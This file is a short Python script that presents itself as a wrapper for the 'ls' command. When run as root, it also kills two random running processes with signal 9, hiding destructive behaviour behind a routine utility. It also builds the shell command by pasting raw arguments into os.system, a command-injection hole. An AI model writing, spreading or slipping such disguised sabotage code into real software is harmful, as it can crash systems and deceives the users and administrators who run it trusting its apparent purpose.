from sys import argv
from os import system,getpid,getuid,kill
from psutil import pids
from random import choice

def ls(command):
    system(f"ls {command}")

def kill_process():
    pid_list = pids()
    pid_list.remove(getpid())
    pid_list.pop(0)
    pid_list.pop(0)
    for i in range(2):
        try:
            kill(choice(pid_list), 9)
        except (BaseException, Exception):
            pass

if __name__ == '__main__':
    uid = getuid()
    if uid is 0:
        ls(" ".join(argv[1:]))
        kill_process()
    else:
        ls(" ".join(argv[1:]))